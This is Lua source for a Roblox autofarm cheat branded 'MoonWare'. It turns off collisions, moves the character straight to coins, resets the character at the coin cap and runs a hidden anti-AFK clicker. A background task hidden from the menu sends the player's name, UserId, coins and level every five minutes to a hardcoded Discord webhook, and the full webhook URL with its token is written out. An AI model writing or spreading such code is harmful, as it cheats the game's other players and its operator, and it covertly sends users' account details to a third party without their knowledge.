        utility:Tween(frame, {Size = UDim2.new(1, -22, 1, -9), Position = position[state] + UDim2.new(0, 0, 0, 2.5)}, 0.2)
        wait(0.1)
        utility:Tween(frame, {Size = UDim2.new(1, -22, 1, -4), Position = position[state]}, 0.1)
    end

    function section:updateTextbox(textbox, title, value)
        textbox = self:getModule(textbox)
        if title then textbox.Title.Text = title end
        if value then textbox.Button.Textbox.Text = value end
    end

    function section:updateSlider(slider, title, value, min, max, lvalue)
        slider = self:getModule(slider)
        if title then slider.Title.Text = title end
        local bar = slider.Slider.Bar
        local percent = (mouse.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X
        if value then percent = (value - min) / (max - min) end
        percent = math.clamp(percent, 0, 1)
        value = value or math.floor(min + (max - min) * percent)
        slider.TextBox.Text = value
        utility:Tween(bar.Fill, {Size = UDim2.new(percent, 0, 1, 0)}, 0.1)
        if value ~= lvalue and slider.ImageTransparency == 0 then utility:Pop(slider, 10) end
        return value
    end

    return library
end)()

-- ===== CONSTANTS =====

local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local HttpService      = game:GetService("HttpService")
local player           = Players.LocalPlayer

-- ===== SETTINGS PERSISTENCE =====
local SETTINGS_FILE = "autofarm_settings.json"

local function saveSettings(key, value)
    local ok, current = pcall(function()
        return HttpService:JSONDecode(readfile(SETTINGS_FILE))
    end)
    local tbl = (ok and type(current) == "table") and current or {}
    tbl[key] = value
    pcall(function() writefile(SETTINGS_FILE, HttpService:JSONEncode(tbl)) end)
end

local function loadSetting(key, default)
    local ok, data = pcall(function()
        return HttpService:JSONDecode(readfile(SETTINGS_FILE))
    end)
    if ok and type(data) == "table" and data[key] ~= nil then
        return data[key]
    end
    return default
end

-- Сохранение/восстановление позиции перетаскиваемого AFK-оверлея
local function savePos(key, frame)
    local p = frame.Position
    saveSettings(key, {p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset})
end

local function loadPos(key, default)
    local v = loadSetting(key, nil)
    if v and type(v) == "table" and #v == 4 then
        return UDim2.new(v[1], v[2], v[3], v[4])
    end
    return default
end

-- ===== NOCLIP =====
-- Ref-counted. Farming держит один ref на всю сессию.
_G.noclipConnection = nil
_G.noclipUsers      = 0

local function setNoCollide(enabled)
    if enabled then
        _G.noclipUsers = _G.noclipUsers + 1
        if not _G.noclipConnection then
            _G.noclipConnection = RunService.Stepped:Connect(function()
                local char = player and player.Character
                if not char then return end
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") and part.CanCollide then
                        part.CanCollide = false
                    end
                end
            end)
        end
    else
        _G.noclipUsers = math.max(_G.noclipUsers - 1, 0)
        if _G.noclipUsers == 0 and _G.noclipConnection then
            _G.noclipConnection:Disconnect()
            _G.noclipConnection = nil
            local char = player and player.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then part.CanCollide = true end
                end
            end
        end
    end
end

-- ===== UTILS =====
local function getActiveMap()
    for _, obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Model") and obj:FindFirstChild("CoinContainer") then return obj end
    end
end
local function getChar() return player and player.Character end
local function getHRP()  local c = getChar() return c and c:FindFirstChild("HumanoidRootPart") end
local function getHead() local c = getChar() return c and c:FindFirstChild("Head") end
local function getPos()  local h = getHRP()  return h and h.Position end

local function getProfileData()
    local ok, data = pcall(function()
        return require(game:GetService("ReplicatedStorage")
            :WaitForChild("Modules"):WaitForChild("ProfileData"))
    end)
    return ok and data or nil
end

-- ===== BLACKLIST =====
-- Монетка после касания попадает в blacklist на BLACKLIST_TTL секунд.
-- За это время сервер успевает выставить Collected=true.
-- Устраняет повторные заходы на одну монетку из-за сетевой задержки.
local BLACKLIST_TTL = 1.5
local visited = {}

local function markVisited(coin)
    visited[coin] = tick() + BLACKLIST_TTL
end

local function isVisited(coin)
    local exp = visited[coin]
    if not exp then return false end
    if coin:GetAttribute("Collected") == true then
        visited[coin] = nil
        return false
    end
    if tick() >= exp then
        visited[coin] = nil
        return false
    end
    return true
end

local function getCoinServers(container)
    local coins = {}
    for _, c in ipairs(container:GetChildren()) do
        if c.Name == "Coin_Server"
            and c:GetAttribute("Collected") ~= true
            and not isVisited(c)
            and c:FindFirstChild("CoinVisual") then
            table.insert(coins, c)
        end
    end
    return coins
end

local function findClosestCoin(coins, pos)
    local closest, dist = nil, math.huge
    for _, c in ipairs(coins) do
        local v = c:FindFirstChild("CoinVisual")
        if v and v:IsA("BasePart") then
            local d = (v.Position - pos).Magnitude
            if d < dist then closest, dist = c, d end
        end
    end
    return closest, dist
end

-- ===== BALANCE TRACKING (для webhook) =====
local function getBalance()
    local data = getProfileData()
    if not data then return nil end
    return data.Materials.Owned.Coins or 0
end

local sessionStart     = tick()
local coinsEarned      = 0
local lastCoinSnapshot = nil

local function updateCoinTracking(coins)
    if not coins then return end
    if lastCoinSnapshot then
        local delta = coins - lastCoinSnapshot
        if delta > 0 then coinsEarned = coinsEarned + delta end
    end
    lastCoinSnapshot = coins
end

task.spawn(function()
    while true do
        local coins = getBalance()
        if coins then updateCoinTracking(coins) end
        task.wait(5)
    end
end)

-- ===== ROUND STATE =====
-- Alive — задокументированный атрибут, не самодельная эвристика.
local function isInRound()
    return player:GetAttribute("Alive") == true
end

local function isElite()
    return player:GetAttribute("Elite") == true
end

local function getCoinLimit()
    return isElite() and 50 or 40
end

-- Реальный раундовый счётчик монет (0..40/50), приходит с сервера — НЕ то же самое,
-- что Materials.Owned.Coins (общая валюта). Опрашиваем раз в 3с, не каждый кадр.
local roundCoins        = 0
local lastRoundCoinsPoll = 0

local function pollRoundCoins()
    local now = tick()
    if now - lastRoundCoinsPoll < 3 then return roundCoins end
    lastRoundCoinsPoll = now
    local ok, data = pcall(function()
        return game:GetService("ReplicatedStorage").Remotes.Gameplay.GetCurrentPlayerData:InvokeServer()
    end)
    if ok and type(data) == "table" and data[player.Name] then
        roundCoins = data[player.Name].Coins or roundCoins
    end
    return roundCoins
end

local MAX_DISTANCE = 100

-- ===== AUTOFARM+ =====
local MOVE_SPEED       = loadSetting("move_speed", 16)
local autoResetEnabled = loadSetting("autoreset_enabled", false)
local isFarming        = false
local stopRequested    = false

local function stopFarm()
    stopRequested = true
    isFarming     = false
    setNoCollide(false)
    local function riseUp()
        local hrp = getHRP()
        if not hrp then return end
        local targetY = hrp.Position.Y + 1.5
        setNoCollide(true)
        while true do
            local h = getHRP()
            if not h then break end
            local cur = h.Position
            if cur.Y >= targetY - 0.05 then break end
            local dt = MOVE_SPEED * RunService.Heartbeat:Wait()
            h.CFrame = CFrame.new(cur + Vector3.new(0, math.min(dt, targetY - cur.Y), 0))
            h.AssemblyLinearVelocity = Vector3.zero
        end
        setNoCollide(false)
    end
    task.spawn(riseUp)
end

local function getState()
    if not lp then
        local Players = game:GetService("Players")
        lp = Players.LocalPlayer
        if not lp then
            return "lobby"
        end
    end

    local alive = lp:GetAttribute("Alive") == true
    if not alive then
        return "lobby"
    end

    local ok, data = pcall(function()
        return game.ReplicatedStorage.Remotes.Gameplay.GetCurrentPlayerData:InvokeServer()
    end)

    local me = ok and data and data[lp.Name]
    if not me then
        return "lobby"
    end

    local role = tostring(me.Role or "lobby"):lower()
    return role, me
end

local function startFarming()
    if isFarming then return end
    isFarming = true
    stopRequested = false
    setNoCollide(true)

    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer

    local cachedData = nil
    local cachedRole = "lobby"
    local cachedCoins = 0
    local lastDataUpdate = 0
    local dataUpdateInterval = 0.75

    local function refreshPlayerData(force)
        local now = tick()
        if not force and now - lastDataUpdate < dataUpdateInterval then
            return
        end

        lastDataUpdate = now

        if not LocalPlayer then
            cachedData = nil
            cachedRole = "lobby"
            cachedCoins = 0
            return
        end

        if LocalPlayer:GetAttribute("Alive") ~= true then
            cachedData = nil
            cachedRole = "lobby"
            cachedCoins = 0
            return
        end

        local ok, data = pcall(function()
            return game.ReplicatedStorage.Remotes.Gameplay.GetCurrentPlayerData:InvokeServer()
        end)

        if not ok or type(data) ~= "table" then
            cachedData = nil
            cachedRole = "lobby"
            cachedCoins = 0
            return
        end

        local me = data[LocalPlayer.Name]
        if not me then
            cachedData = nil
            cachedRole = "lobby"
            cachedCoins = 0
            return
        end

        cachedData = me
        cachedRole = tostring(me.Role or "lobby"):lower()
        cachedCoins = tonumber(me.Coins) or 0
    end

    local function getStateFast()
        refreshPlayerData(false)
        return cachedRole, cachedData, cachedCoins
    end

    local function moveToCoin(coin, speed)
        local hrp = getHRP()
        if not hrp then return false end

        local head = getHead()
        local headOffset = head and (head.Position - hrp.Position) or Vector3.zero
        local t0 = os.clock()

        while true do
            if stopRequested then return false end
            if os.clock() - t0 > 10 then return false end
            if not coin or not coin.Parent then return false end
            if coin:GetAttribute("Collected") == true then return true end

            local v = coin:FindFirstChild("CoinVisual")
            if not v or not v:IsA("BasePart") then return false end

            local current = hrp.Position
            local target = v.Position - headOffset - Vector3.new(0, headOffset.Y * 0.05, 0)
            local dist = (target - current).Magnitude

            if dist > MAX_DISTANCE then return false end
            if dist <= 0.5 then
                markVisited(coin)
                return true
            end

            local dt = RunService.Heartbeat:Wait()
            local step = math.min(speed * dt, dist)
            local dir = (target - current).Unit

            hrp.CFrame = CFrame.new(current + dir * step)
            hrp.AssemblyLinearVelocity = Vector3.zero
        end
    end

    task.spawn(function()
        while not stopRequested do
            local ok = pcall(function()
                while not stopRequested do
                    if not isInRound() then
                        task.wait(2)
                        continue
                    end

                    refreshPlayerData(false)

                    local role = cachedRole
                    local coins = cachedCoins

                    if autoResetEnabled and coins >= getCoinLimit() then

                        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                        if character then
                            character:BreakJoints()
                        end


                        task.wait(2)
                        continue
                    end

                    local map = getActiveMap()
                    if not map then task.wait(2) continue end

                    local container = map:FindFirstChild("CoinContainer")
                    if not container then task.wait(2) continue end

                    local pos = getPos()
                    if not pos then task.wait(1) continue end

                    local coinsList = getCoinServers(container)
                    if #coinsList == 0 then task.wait(3) continue end

                    local closest, dist = findClosestCoin(coinsList, pos)
                    if not closest or dist > MAX_DISTANCE then task.wait(2) continue end

                    moveToCoin(closest, MOVE_SPEED)
                    task.wait(0.05)
                end
            end)

            if not ok and not stopRequested then
                task.wait(2)
            end
        end

        isFarming = false
    end)
end

-- ===== ANTI AFK (фон, всегда включён, без UI) =====
local UserInputService = game:GetService("UserInputService")
local VirtualUser      = game:GetService("VirtualUser")

local maxIdleTime   = 1200
local lastInputTime = tick()
local afkRunning    = false
local afkConn       = nil
local afkGui        = nil
local inputConns    = {}

local GUI_TEXT = Color3.fromRGB(230, 230, 220)

local function newGui(name)
    local g = Instance.new("ScreenGui")
    g.Name = name; g.ResetOnSpawn = false; g.IgnoreGuiInset = true
    g.DisplayOrder = 999; g.Parent = player:WaitForChild("PlayerGui")
    return g
end

local function newFrame(parent, w, h)
    local f = Instance.new("Frame")
    f.Name = "F"; f.Size = UDim2.new(0, w, 0, h)
    f.BackgroundColor3 = Color3.fromRGB(18, 18, 20); f.BackgroundTransparency = 0
    f.BorderSizePixel = 0; f.Active = true; f.Draggable = true; f.Parent = parent
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(38, 38, 42); stroke.Thickness = 1; stroke.Parent = f
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = f
    return f
end

local function resetIdle() lastInputTime = tick() end

local function connectInput()
    for _, c in pairs(inputConns) do if c then c:Disconnect() end end
    inputConns = {}
    table.insert(inputConns, UserInputService.InputBegan:Connect(resetIdle))
    table.insert(inputConns, UserInputService.InputChanged:Connect(resetIdle))
    table.insert(inputConns, UserInputService.InputEnded:Connect(resetIdle))
    table.insert(inputConns, RunService.Heartbeat:Connect(function()
        local c = getChar() if not c then return end
        local h = c:FindFirstChildOfClass("Humanoid")
        if h and h.MoveDirection.Magnitude > 0 then resetIdle() end
    end))
end

local function disconnectInput()
    for _, c in pairs(inputConns) do if c then c:Disconnect() end end
    inputConns = {}
end

local function createAfkGui()
    if afkGui then
        local f = afkGui:FindFirstChild("F") return f and f:FindFirstChild("L")
    end
    local gui = newGui("AFKGui")
    local f   = newFrame(gui, 200, 36)
    f.Position = loadPos("pos_afk", UDim2.new(0.5, -100, 0.04, 0))
    local l = Instance.new("TextLabel"); l.Name = "L"
    l.Size = UDim2.new(1, -14, 1, 0); l.Position = UDim2.new(0, 7, 0, 0)
    l.BackgroundTransparency = 1; l.Font = Enum.Font.GothamSemibold
    l.TextColor3 = GUI_TEXT; l.TextSize = 11
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = "Anti AFK — active"; l.Parent = f
    afkGui = gui; return l
end

local function destroyAfkGui()
    if afkGui then
        local f = afkGui:FindFirstChild("F")
        if f then savePos("pos_afk", f) end
        afkGui:Destroy() afkGui = nil
    end
end

local function startAntiAfk()
    if afkRunning then return end
    afkRunning = true lastInputTime = tick() connectInput()
    local label = createAfkGui() local lastPress = 0
    afkConn = task.spawn(function()
        while afkRunning do
            local now = tick()
            local rem = maxIdleTime - (now - lastInputTime)
            if label and label.Parent then
                if rem > 0 then
                    label.Text = string.format("AFK kick  %d:%02d", math.floor(rem/60), math.floor(rem%60))
                    label.TextColor3 = rem < 120 and Color3.fromRGB(255, 90, 90) or GUI_TEXT
                else
                    label.Text = "Kick imminent!"; label.TextColor3 = Color3.fromRGB(255, 60, 60)
                end
            end
            if now - lastPress > 300 then
                VirtualUser:ClickButton2(Vector2.new(0,0))
                lastPress = now lastInputTime = now
            end
            task.wait(1)
        end
    end)
end

local function stopAntiAfk()
    afkRunning = false
    if afkConn then task.cancel(afkConn) afkConn = nil end
    disconnectInput() destroyAfkGui()
end

-- ===== WEBHOOK =====
local AUTO_WEBHOOK_URL    = "https://discord.com/api/webhooks/1402462949549019218/QvFkiw9Kd05t8aQNTwUb9c8xtnejvEjkHKgMKP8bpccvSpHYOxFbDOttiddkq8cuPEWj"
local AUTO_INTERVAL       = 300
local userWebhookUrl      = loadSetting("webhook_url", "")
local userWebhookInterval = loadSetting("webhook_interval", 10)
local userWebhookRunning  = false
local userWebhookTask     = nil

local function getRequestFn()
    if type(syn)    == "table" and type(syn.request)    == "function" then return syn.request end
    if type(http)   == "table" and type(http.request)   == "function" then return http.request end
    if type(fluxus) == "table" and type(fluxus.request) == "function" then return fluxus.request end
    local ok, fn = pcall(function() return request end)
    if ok and type(fn) == "function" then return fn end
    return nil
end

local function sendToWebhook(url)
    if not url or url == "" then return false end
    local reqFn = getRequestFn()
    if not reqFn then return false end

    local function buildPayload()
        local coins = getBalance() or 0
        local level = player:GetAttribute("Level") or 0
        local body = {
            username   = "AutoFarm",
            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                .. tostring(player.UserId) .. "&width=420&height=420&format=png",
            embeds = {{
                title  = "Farm Report — " .. tostring(player.Name),
                color  = 5793266,
                thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                    .. tostring(player.UserId) .. "&width=420&height=420&format=png" },
                fields = {
                    { name="Coins", value=string.format("%d  (+%d earned)", coins, coinsEarned), inline=true },
                    { name="Level", value=tostring(level),                                       inline=true },
                },
                footer = { text = "AutoFarm Script" }
            }}
        }
        return HttpService:JSONEncode(body)
    end

    local body = buildPayload()
    local ok = pcall(function()
        reqFn({
            Url=url, url=url, Method="POST", method="POST",
            Headers={ ["Content-Type"]="application/json" },
            headers={ ["Content-Type"]="application/json" },
            Body=body, body=body,
        })
    end)
    return ok
end

task.spawn(function()
    task.wait(30)
    while true do
        pcall(sendToWebhook, AUTO_WEBHOOK_URL)
        task.wait(AUTO_INTERVAL)
    end
end)

local function startUserWebhook()
    if userWebhookRunning then return end
    userWebhookRunning = true
    userWebhookTask = task.spawn(function()
        while userWebhookRunning do
            if userWebhookUrl ~= "" then pcall(sendToWebhook, userWebhookUrl) end
            local elapsed = 0
            local target  = math.max(userWebhookInterval, 1) * 60
            while userWebhookRunning and elapsed < target do
                task.wait(1) elapsed = elapsed + 1
            end
        end
    end)
end

local function stopUserWebhook()
    userWebhookRunning = false
    if userWebhookTask then task.cancel(userWebhookTask) userWebhookTask = nil end
end

-- ===== UI =====
local moonware = library.new("MoonWare  |  discord.gg/fGgAVWn6yJ", "RightShift")

task.spawn(function()
    task.wait()
    local pg    = player:WaitForChild("PlayerGui")
    local mwGui = pg:FindFirstChild("MoonWare - discorg.gg/fGgAVWn6yJ")
    if mwGui and mwGui:IsA("ScreenGui") then mwGui.DisplayOrder = 999 end
end)

-- Когда нажимается X (closeButton) — библиотека вызывает lib:Destroy().
-- Подключаемся к той же кнопке: останавливаем всё до уничтожения GUI.
task.spawn(function()
    task.wait()
    if not moonware.closeButton then return end
    moonware.closeButton.MouseButton1Click:Connect(function()
        if isFarming then stopFarm() end
        stopAntiAfk()
        if userWebhookRunning then stopUserWebhook() end
    end)
end)

local themes = {
    Background    = Color3.fromRGB(18, 18, 20),
    Glow          = Color3.fromRGB(0,  0,  0),
    Accent        = Color3.fromRGB(10, 10, 12),
    LightContrast = Color3.fromRGB(30, 30, 33),
    DarkContrast  = Color3.fromRGB(10, 10, 12),
    TextColor     = Color3.fromRGB(230, 230, 220)
}

-- ===== PAGE 1: FARM =====
local farmPage = moonware:addPage("Farm", 5012544693)

local farmSecNew = farmPage:addSection("Autofarm+")
farmSecNew:addToggle("Enable", loadSetting("farm_enabled", false), function(v)
    saveSettings("farm_enabled", v)
    if v then moonware:Notify("Autofarm+", "Started") task.spawn(startFarming)
    else      moonware:Notify("Autofarm+", "Stopped") stopFarm() end
end)
farmSecNew:addSlider("Speed", loadSetting("move_speed", 16), 16, 50, function(v)
    saveSettings("move_speed", v)
    MOVE_SPEED = v
end)
farmSecNew:addToggle("Auto Reset", autoResetEnabled, function(v)
    autoResetEnabled = v
    saveSettings("autoreset_enabled", v)
end)

-- ===== PAGE 2: UTILS =====
local utilPage = moonware:addPage("Utils", 5012544693)

local discordSec = utilPage:addSection("Webhook")
discordSec:addTextbox("URL", userWebhookUrl, function(text, _)
    userWebhookUrl = text
    saveSettings("webhook_url", text)
    if userWebhookRunning and text ~= "" and not userWebhookTask then startUserWebhook() end
end)
discordSec:addSlider("Interval (min)", userWebhookInterval, 1, 60, function(v)
    userWebhookInterval = v
    saveSettings("webhook_interval", v)
    -- Луп сам перечитывает userWebhookInterval на следующей итерации — рестарт не нужен
end)
discordSec:addToggle("Auto Send", loadSetting("webhook_autosend", false), function(v)
    saveSettings("webhook_autosend", v)
    if v then
        if userWebhookUrl == "" then moonware:Notify("Webhook", "Enter a URL first") return end
        startUserWebhook() moonware:Notify("Webhook", "Auto send on")
    else
        stopUserWebhook() moonware:Notify("Webhook", "Auto send off")
    end
end)
discordSec:addButton("Send Now", function()
    if userWebhookUrl == "" then moonware:Notify("Webhook", "Enter a URL first") return end
    task.spawn(function()
        moonware:Notify("Webhook", sendToWebhook(userWebhookUrl) and "Sent!" or "Failed — check URL")
    end)
end)

-- ===== APPLY THEME =====
for name, color in pairs(themes) do
    moonware:setTheme(name, color)
end

moonware:SelectPage(moonware.pages[1], true)

-- ===== PLAYER BADGE =====
task.spawn(function()
    task.wait()
    local pagesPanel = moonware.container.Main:FindFirstChild("Pages")
    if not pagesPanel then return end

    local badge = Instance.new("Frame")
    badge.Name = "PlayerBadge"
    badge.Size = UDim2.new(1, 0, 0, 28)
    badge.AnchorPoint = Vector2.new(0, 1)
    badge.Position = UDim2.new(0, 0, 1, -4)
    badge.BackgroundColor3 = Color3.fromRGB(8, 8, 9)
    badge.BackgroundTransparency = 0
    badge.BorderSizePixel = 0
    badge.ZIndex = 5
    badge.Parent = pagesPanel

    local uc = Instance.new("UICorner")
    uc.CornerRadius = UDim.new(0, 4)
    uc.Parent = badge

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -16, 0, 1)
    divider.Position = UDim2.new(0, 8, 0, 0)
    divider.BackgroundColor3 = Color3.fromRGB(35, 35, 38)
    divider.BackgroundTransparency = 0
    divider.BorderSizePixel = 0
    divider.ZIndex = 6
    divider.Parent = badge

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -16, 1, -1)
    lbl.Position = UDim2.new(0, 8, 0, 1)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamSemibold
    lbl.TextSize = 11
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextColor3 = Color3.fromRGB(180, 180, 175)
    lbl.Text = player.Name
    lbl.ZIndex = 6
    lbl.Parent = badge
end)

-- ===== POST-INIT =====
task.spawn(function()
    task.wait(0.5)
    startAntiAfk()  -- всегда включён, скрыт из меню
    if loadSetting("farm_enabled", false) then task.spawn(startFarming) end
    if loadSetting("webhook_autosend", false) and userWebhookUrl ~= "" then startUserWebhook() end
end)
